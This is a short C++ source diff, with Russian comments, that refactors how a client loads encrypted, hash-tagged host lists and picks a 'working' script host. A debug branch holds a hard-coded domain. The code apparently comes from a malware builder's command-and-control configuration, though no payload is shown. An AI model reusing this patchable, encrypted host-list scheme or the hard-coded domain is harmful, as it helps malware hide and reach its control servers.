@@ -37,7 +37,7 @@ namespace AZDATA
 
 #ifdef USE_AZ_CONFIG
 
-	char AZ_HOSTS[AZ_HOSTS_SIZE] = "__AZ_HOSTS__\0\0";
+	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
 
 	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */
 
@@ -52,7 +52,7 @@ namespace AZDATA
 	char AZ_SCRIPTS_HOSTS[] = "rus.gipa.in\0\0";
 #else
 	// Рабочий массив
-	char AZ_SCRIPTS_HOSTS[AZ_SCRIPTS_HOSTS_SIZE] = "__AZ_SCRIPTS_HOSTS__\0\0";
+	char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
 #endif
 
 #define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
@@ -66,7 +66,7 @@ namespace AZDATA
 string GetAzHost()
 {
 	#ifdef USE_AZ_CONFIG
-		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, true);
+		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
 	#else
     	return GetActiveHost2();
 	#endif
@@ -102,7 +102,7 @@ void AzInicializeHostChecker()
 		#ifdef DEBUGCONFIG
         	bool Encrypted = false;
 		#else
-        	bool Encrypted = true;
+        	bool Encrypted = AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS;
 		#endif
 		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
     }
@@ -156,6 +156,5 @@ string AzGetScriptHost()
 
 	// Запрашиваем рабочий хост
 	return AZDATA::Checker->GetWorkHost();
-
 }
 //-----------------------------------------------------------------------------
